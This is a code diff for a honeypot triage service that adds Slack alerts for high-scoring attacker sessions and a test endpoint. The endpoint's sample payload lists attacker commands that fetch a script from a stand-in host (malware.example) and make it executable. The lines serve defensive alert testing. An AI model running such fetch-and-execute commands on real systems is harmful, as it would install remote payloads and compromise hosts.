@@ -19,6 +19,7 @@ from sessions import group_sessions
 from enrichment import enrich_ip
 from claude_client import triage_session
 from supabase_writer import upsert_session
+import slack_notify
 
 _STATE_FILE = Path(__file__).parent / ".state_since"
 
@@ -133,6 +134,9 @@ async def _process(s: dict) -> None:
     tag = "ai " if (s.get("commands_tried") or s.get("high_signal")) else "fast"
     print(f"[{tag}] {ip} score={score}: {summary[:80]}")
 
+    # SOAR tier 1: escalate high-notability attackers to Slack (no-op if unset).
+    await slack_notify.notify(s, enr, summary, techniques, score)
+
 
 async def _flush() -> None:
     grace = timedelta(seconds=settings.session_grace_seconds)
@@ -195,3 +199,17 @@ app = FastAPI(title="Tripwire Triage Service", lifespan=lifespan)
 @app.get("/health")
 async def health() -> dict:
     return {"status": "ok", **state}
+
+
+@app.post("/test-slack")
+async def test_slack() -> dict:
+    """Fire a sample high-notability alert to verify the Slack wiring, without
+    waiting for a real score-5 attacker."""
+    await slack_notify.notify(
+        {"source_ip": "203.0.113.7", "commands_tried": ["uname -a", "wget http://malware.example/x.sh", "chmod +x x.sh"]},
+        {"country": "Testland", "asn": "AS0 Example", "abuseipdb_score": 100, "vt_malicious_count": 9},
+        "TEST MESSAGE — simulated notable attack to confirm Slack escalation is wired up.",
+        ["T1105: Ingress Tool Transfer", "T1059: Command and Scripting Interpreter"],
+        5,
+    )
+    return {"sent": bool(settings.slack_webhook_url), "threshold": settings.slack_notify_threshold}
